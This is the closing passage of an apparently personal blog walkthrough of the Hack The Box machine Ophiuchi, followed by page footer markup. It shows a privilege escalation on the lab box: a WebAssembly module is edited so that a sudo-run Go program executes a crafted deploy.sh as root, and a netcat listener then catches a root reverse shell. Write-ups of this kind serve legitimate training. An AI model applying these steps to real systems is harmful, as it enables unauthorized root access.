+  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
+  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type </span>0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
+      i32.const 0<span class="o">)</span>
+  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 1 1 funcref<span class="o">)</span>
+  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
+  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
+  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
+  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
+  <span class="o">(</span><span class="nb">export</span> <span class="s2">"memory"</span> <span class="o">(</span>memory 0<span class="o">))</span>
+  <span class="o">(</span><span class="nb">export</span> <span class="s2">"info"</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
+  <span class="o">(</span><span class="nb">export</span> <span class="s2">"__data_end"</span> <span class="o">(</span>global 1<span class="o">))</span>
+  <span class="o">(</span><span class="nb">export</span> <span class="s2">"__heap_base"</span> <span class="o">(</span>global 2<span class="o">)))</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Once we need to return <code class="language-plaintext highlighter-rouge">f == 1</code>, which is a property of <code class="language-plaintext highlighter-rouge">info</code>, we needed to change the line <code class="language-plaintext highlighter-rouge">i32.const 0</code> to <code class="language-plaintext highlighter-rouge">i32.const 1</code> at line 4.</p>
+  </li>
+  <li>
+    <p>After changing it, compiled the file again to <code class="language-plaintext highlighter-rouge">main.wasm</code> and transferred it to the victim machine as below</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wabt-1.0.23/bin/wat2wasm main.wat <span class="nt">-o</span> main.wasm
+scp main.wasm admin@10.10.10.227:/dev/shm/zurc
+</code></pre></div></div>
+
+<ul>
+  <li>In a second attempt, we had success on running the crafted deploy.sh as root <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">
+</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@ophiuchi:/dev/shm/zurc<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>After that, modified the file to the previously shared reverse shell command line, obtained interactive access as root, and was able to get its flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
+listening on <span class="o">[</span>any] 4443 ...
+connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227] 50068
+<span class="c"># hostname &amp;&amp; id</span>
+ophiuchi
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># cat /root/root.txt</span>
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>I hope you have enjoyed it!</p>
+
+<p>See you in the next post <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-linux" class="page__taxonomy-item p-category" rel="tag">HTB Linux</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-medium" class="page__taxonomy-item p-category" rel="tag">HTB Medium</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/categories/#walkthrough" class="page__taxonomy-item p-category" rel="tag">Walkthrough</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-07-03T13:00:00-03:00">July 3, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share" id="sharelinks">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <!-- CUSTOM: Localized sharing links -->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Walktrough%3A+HTB+Ophiuchi%20https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F07%2Fhtb-ophiuchi" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F07%2Fhtb-ophiuchi" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F07%2Fhtb-ophiuchi" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F07%2Fhtb-ophiuchi" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F07%2Fhtb-ophiuchi&amp;text=Walktrough%3A+HTB+Ophiuchi" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+  <!-- END CUSTOM: Localized sharing links -->
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/en-US/walkthrough/2021/06/htb-spectra" class="pagination--pager" title="Walktrough: HTB Spectra
+">Previous</a>
+    
+    
+    
+      
+        <a href="/en-US/walkthrough/2021/07/htb-thenotebook" class="pagination--pager" title="Walktrough: HTB TheNotebook
+">Next</a>
+      
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/TJKS5F6.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-explore" rel="permalink">Walktrough: HTB Explore
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/07/htb-ophiuchi">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/89b1SdH.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-dynstr" rel="permalink">Walktrough: HTB Dynstr
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/07/htb-ophiuchi">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/JkBtXmO.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-cap" rel="permalink">Walktrough: HTB Cap
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-02T13:00:00-03:00">October 2, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/07/htb-ophiuchi">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/pUqq7fY.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/09/htb-pit" rel="permalink">Walktrough: HTB Pit
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/07/htb-ophiuchi">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Mermaid.js -->
+<script type="module">
+    import mermaid from 'https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs';
+    const config = {
+        "theme": "dark", 
+        "startOnLoad": true
+    };
+    mermaid.initialize(config);
+</script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+    <!-- start custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+    
+      <li><a href="/en-US/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer"><i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
+    <!--<li><a onclick="return klaro.show();"><i class="fas fa-shield-alt" aria-hidden="true"></i> Review consent</a></li>-->
+    
+      
+        
+          <li><a href="/">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
+        
+        
+        
+      
+    
+      
+    
+    <!-- end custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a> &amp; <a href="https://github.com/kurtsson/jekyll-multiple-languages-plugin" rel="nofollow">Multiple Languages Plugin</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz-blog');
+    // CUSTOM : Utterances post mapping due to Jekyll Multilanguage
+    script.setAttribute('issue-term', 'htb-ophiuchi');
+    
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+
+  </body>
+</html>
